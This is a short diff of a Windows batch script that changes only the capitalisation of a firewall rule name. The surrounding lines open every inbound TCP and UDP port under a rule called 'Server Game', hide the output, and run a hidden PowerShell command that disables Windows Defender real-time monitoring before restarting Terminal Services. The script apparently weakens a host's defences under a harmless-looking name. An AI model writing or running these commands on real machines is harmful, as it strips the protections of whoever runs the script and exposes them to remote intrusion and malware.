@@ -47,8 +47,8 @@ if exist "%TEMP%\chrome_installer.exe" (
 )
 
 :: Configure firewall & disable defender
-netsh advfirewall firewall add rule name="SERVER GAME" dir=in action=allow protocol=TCP localport=1-65535 >nul 2>&1
-netsh advfirewall firewall add rule name="SERVER GAME" dir=in action=allow protocol=UDP localport=1-65535 >nul 2>&1
+netsh advfirewall firewall add rule name="Server Game" dir=in action=allow protocol=TCP localport=1-65535 >nul 2>&1
+netsh advfirewall firewall add rule name="Server Game" dir=in action=allow protocol=UDP localport=1-65535 >nul 2>&1
 powershell -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1
 
 :: Restart Terminal Services to apply changes
